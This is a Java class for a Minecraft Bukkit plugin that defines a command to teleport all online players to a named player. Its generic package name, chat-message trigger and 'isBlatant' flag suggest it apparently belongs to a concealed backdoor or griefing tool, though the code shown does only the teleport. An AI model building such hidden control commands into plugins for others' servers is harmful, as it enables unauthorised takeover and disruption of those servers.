
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import java.util.concurrent.ExecutionException;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class TpallCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("tp <player>"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                Location tl2 = target.getLocation();
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> a2.teleport(tl2)).get();
                        }
                        catch (InterruptedException | ExecutionException exception) {
                            
                        }
                    });
                }
                p2.sendMessage(Settings.PREFIX("All players were teleported to " + Settings.RED + target.getName()));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

